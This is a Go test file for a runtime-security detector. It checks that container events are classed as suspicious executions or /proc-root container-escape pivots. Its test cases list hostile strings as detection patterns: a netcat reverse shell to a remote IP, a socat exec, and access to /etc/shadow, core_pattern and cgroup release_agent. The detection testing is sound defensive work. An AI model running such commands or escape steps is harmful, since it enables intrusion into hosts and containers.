package rep

import (
	"testing"

	"github.com/fortuna/core/pkg/models"
)

func TestFalcoSuspiciousExecTarget_MatchesExecutableBasename(t *testing.T) {
	for _, tc := range []struct {
		target string
		want   bool
	}{
		{"/bin/sh -c id", true},
		{"sh", true},
		{"/usr/bin/bash -i", true},
		{"dash", true},
		{"/bin/zsh", true},
		{"/bin/ash -c x", true},
		{"nc -e /bin/sh 10.0.0.1 4444", true},
		{"/usr/bin/ncat", true},
		{"netcat", true},
		{"socat tcp:1.2.3.4:80 exec:sh", true},
		{"curl http://x", true},
		{"/usr/bin/python3.12 -c 'x'", true},
		{"busybox sh", true},
		{"/tmp/payload", true},
		{"/dev/shm/x", true},
		{"/usr/bin/ssh host", false},
		{"/usr/sbin/sshd -D", false},
		{"flush", false},
		{"/bin/sync", false},
		{"launch --foo", false},
		{"/usr/bin/nchan", false},
		{"/usr/bin/pythonista", false},
		{"/app/server --shell=bash", false},
		{"", false},
	} {
		if got := falcoSuspiciousExecTarget(tc.target); got != tc.want {
			t.Errorf("%q: got %v want %v", tc.target, got, tc.want)
		}
	}
}

func TestIsProcRootPivot_OnlyEscapePatterns(t *testing.T) {
	for _, tc := range []struct {
		syscall, target string
		want            bool
	}{
		{"openat", "/proc/1/root", true},
		{"open", "/proc/1/root/etc/shadow", true},
		{"stat", "/proc/4242/root", true},
		{"readlink", "/proc/1/root", true},
		{"chdir", "/proc/1/root", true},
		{"openat", "/proc/sys/kernel/core_pattern", true},
		{"write", "/proc/sys/kernel/core_pattern", true},
		{"openat", "/sys/fs/cgroup/rdma/release_agent", true},
		{"openat", "/proc/self/exe", false},
		{"readlink", "/proc/self/exe", false},
		{"readlink", "/proc/1/exe", false},
		{"readlink", "/proc/4242/exe", false},
		{"openat", "/proc/self/root", false},
		{"openat", "/proc/self/status", false},
		{"openat", "/proc/1/rootfs-info", false},
		{"stat", "/proc/sys/kernel/core_pattern", false},
		{"execve", "/proc/1/root", false},
	} {
		if got := isProcRootPivot(tc.syscall, tc.target); got != tc.want {
			t.Errorf("%s %s: got %v want %v", tc.syscall, tc.target, got, tc.want)
		}
	}
}

func TestClassifyEventToSignal_UsesSharedHeuristics(t *testing.T) {
	if st, _, _ := classifyEventToSignal(&models.RuntimeEvent{Syscall: "readlink", TargetPath: "/proc/self/exe"}); st == "PROC_ROOT_PIVOT" {
		t.Fatal("/proc/self/exe must not be PROC_ROOT_PIVOT")
	}
	if st, _, _ := classifyEventToSignal(&models.RuntimeEvent{Syscall: "openat", TargetPath: "/proc/1/root"}); st != "PROC_ROOT_PIVOT" {
		t.Fatalf("/proc/1/root: got %s", st)
	}
	if st, _, _ := classifyEventToSignal(&models.RuntimeEvent{Syscall: "execve", TargetPath: "/usr/bin/ssh host", Runtime: "falco"}); st == "SUSPICIOUS_EXEC_FROM_SNAPSHOT" {
		t.Fatal("ssh must not be a suspicious exec")
	}
}
